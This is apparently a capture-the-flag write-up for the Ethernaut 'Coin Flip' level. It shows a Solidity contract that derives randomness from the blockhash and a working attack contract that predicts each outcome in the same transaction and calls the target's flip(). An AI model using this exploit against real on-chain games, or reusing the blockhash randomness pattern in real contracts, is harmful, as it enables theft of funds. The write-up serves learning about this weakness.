# Coin Flip Contract

>Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

>To get cryptographically proven random numbers, you can use Chainlink VRF, which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

>Some other options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize).

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

# Solution
The CoinFlip contract uses the current blockhash to determine wether or not it is heads or tails so we need a way to get the blockhash and determine that before the contract does.
We will need to use the Remix IDE to create our own contract that calls this one. This contract will look exactly like the CoinFlip contract with the exception of adding:

```
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}


address hackedContract = 0x4E502dEeCf2ef4229aaFf5BEfc6545991ea2935E;
ICoinFlip(hackedContract).flip(_guess);
ICoinFlip(hackedContract).flip(!_guess);
```

You can see the implementation in the following:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract HackCoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address hackedContract = 0x4E502dEeCf2ef4229aaFf5BEfc6545991ea2935E; // ethernaut CoinFlip address

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      ICoinFlip(hackedContract).flip(_guess);
      return true;
    } else {
        ICoinFlip(hackedContract).flip(!_guess);
      consecutiveWins = 0;
      return false;
    }
  }
}
```

This contract creates an interface that connects our contract to the external contract. The name of the functions and types need to match the external contract:
```
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}
```

Then we are adding the contract address of coinflip which the interface will use to check for the flip() function:
```
address hackedContract = 0x4E502dEeCf2ef4229aaFf5BEfc6545991ea2935E;
```

This part is where we call the flip contract no matter the outcome. Because our contract is calling the CoinFlip contract within the same transaction, the blockhash is the same for both our contract and the CoinFlip contract. So we run the flip() function ourself and whatever the answer we get, we will send that down to CoinFlip:
```
ICoinFlip(hackedContract).flip(_guess);
```

## What I learned:
1. Connecting to an external contract to call functions.
2. How using blockhash or anything that is attached to the current transaction is not a good for randomization since this can be manipulated.
